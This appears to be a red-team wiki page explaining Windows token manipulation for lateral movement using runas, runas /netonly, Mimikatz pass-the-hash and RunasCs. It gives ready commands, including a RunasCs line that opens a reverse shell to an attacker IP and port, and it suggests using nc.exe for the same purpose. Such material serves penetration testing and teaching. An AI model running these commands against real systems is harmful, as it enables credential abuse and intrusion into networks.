---
label: Access Token Manipulation
subLabel: (RunAs, RunasCs)
---

# Token Manipulation for Lateral Movement

> **Requirements**
>
> * Credentials (password, NT hash) of the target user.

Token Manipulation allows you to run a process (e.g. cmd) as another user and get its permissions on   the network. It can be used for lateral movement in conjunction with other techniques if, for example, the target user is a local administrator on some other machine.

## RunAs (using password)

> **IMPORTANT**: RunAs requires plaintext password.

RunAs is a built-in Windows tool for token manipulation. It allows you to run a process with another user's access token. In practice, this means obtaining the rights of another user. Each time, a password prompt is displayed and **you have to enter the password of the target user**. The password is verified before creating the process using SAM (for local users) or Domain Controller (for domain users).

The process created by RunAs has logon of the **Interactive type** (reusable credentials are available) and access token of the target user (`whoami` returns target user).

> **NOTICE**: This is very useful in conjunction with built-in commands that do not have the ability to specify a user and password (e.g. `sc.exe` or `schtasks.exe`). With `RunAs` you are able to use these commands as another user and perform lateral movement.

```powershell
# Using password
runas /u:$domain\$target_user cmd.exe
```

### RunAs /netonly

Sometimes you have a valid password that RunAs cannot verify (e.g. local user of an other machine) but it can be used to perform network connections. The `/netonly` flag specifies that the **provided credentials are for remote access only and Windows doesn't validate them**.

The process created by `runas /netonly` has logon of the **NewCredentials type**. It's a rare type of logon. The new logon session has the same local identity (`whoami` returns current user), but **it uses newly provided credentials for other network connections**. In short, with the `/netonly` flag, you are not locally another user, but on the network you have the privileges of another user effectively.

```powershell
# Using password
runas /u:$domain\$target_user /netonly cmd.exe
```

## Mimikatz (using NT hash)

Using Mimikatz we are able to do exactly the same as `runas /netonly` but with NT hash instead of plaintext password.

```powershell
# Using NT hash
mimikatz.exe
> privilege::debug
> sekurlsa::pth /user:$target_user /domain:$domain /ntlm:$nt_hash /run:cmd.exe
```

## RunasCs (using password)

If we don't have stable access to the machine over RDP or another more convenient method, we probably won't want to use the default `runas.exe` because it doesn't allow us to pass the password directly in the command line. Instead, we will use the specialized tool: `RunasCs.exe` ([GitHub](https://github.com/antonioCoco/RunasCs)). This is a **custom offensive utility to run specific processes under a different user account by specifying explicit credentials**. It performs sophisticated access token manipulation under the hood.

RunasCs has many different parameters useful in red-teaming, below we present the most useful.

> **NOTICE**: You can execute for example `nc.exe [...]` using `RunasCs` and get a reverse shell as a different user. `RunasCs` also has built-in ability (read below) to redirect standard streams of a command to a remote host.

```powershell
# Run command as a local user
RunasCs.exe $user $pass "$command"

# Run command as a domain user (logon type: 8, NetworkCleartext)
RunasCs.exe $user $pass "$command" -d $domain -l 8

# Redirect stdin/out/err of the command to a remote host
RunasCs.exe $user $pass cmd.exe -r $attacker_ip:$attacker_port
```

{/*TODO:Overpass-the-Hash, Pass-the-Ticket*/}
{/*./Rubeus.exe asktgt /user:$user /aes256:$aes /createnetonly:C\Windows\System32\cmd.exe /show /ptt*/}

## Resources

* [ATTL4S & ElephantSe4l, *Understanding Windows Lateral Movement*](https://attl4s.github.io/assets/pdf/Understanding_Windows_Lateral_Movements.pdf)
